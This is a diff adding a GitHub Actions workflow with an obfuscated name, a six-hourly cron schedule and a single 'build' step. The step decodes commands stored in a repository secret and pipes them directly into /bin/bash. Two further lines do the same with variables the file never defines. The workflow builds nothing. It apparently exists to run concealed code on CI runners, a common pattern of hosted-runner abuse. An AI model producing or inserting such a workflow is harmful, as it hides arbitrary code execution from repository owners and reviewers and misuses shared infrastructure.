@@ -1,0 +1,19 @@
+name: rangaleracketeer
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: rangaleracketeer
+        env:
+          yoea36: ${{ secrets.yoea36 }}
+        run: |
+          echo $yoea36 | jq -r .lwd7 | /bin/bash
+          echo $bixgw2 | jq -r .pnw85257 | /bin/bash
+          echo $opwux85835 | jq -r .zk8 | /bin/bash
+
